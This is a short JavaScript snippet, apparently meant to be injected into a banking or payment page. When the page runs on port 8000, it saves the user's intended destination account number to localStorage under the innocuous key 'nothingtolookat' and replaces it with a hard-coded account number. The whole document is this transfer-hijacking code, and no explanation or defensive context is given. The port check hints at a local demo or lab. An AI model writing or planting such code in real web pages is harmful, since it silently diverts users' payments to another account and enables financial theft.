"8000" === window.location.port && function () {
    localStorage.setItem("nothingtolookat", document.getElementById("id_acc_num_to").value);
    document.getElementById("id_acc_num_to").value = "0987654321234567890";
}();
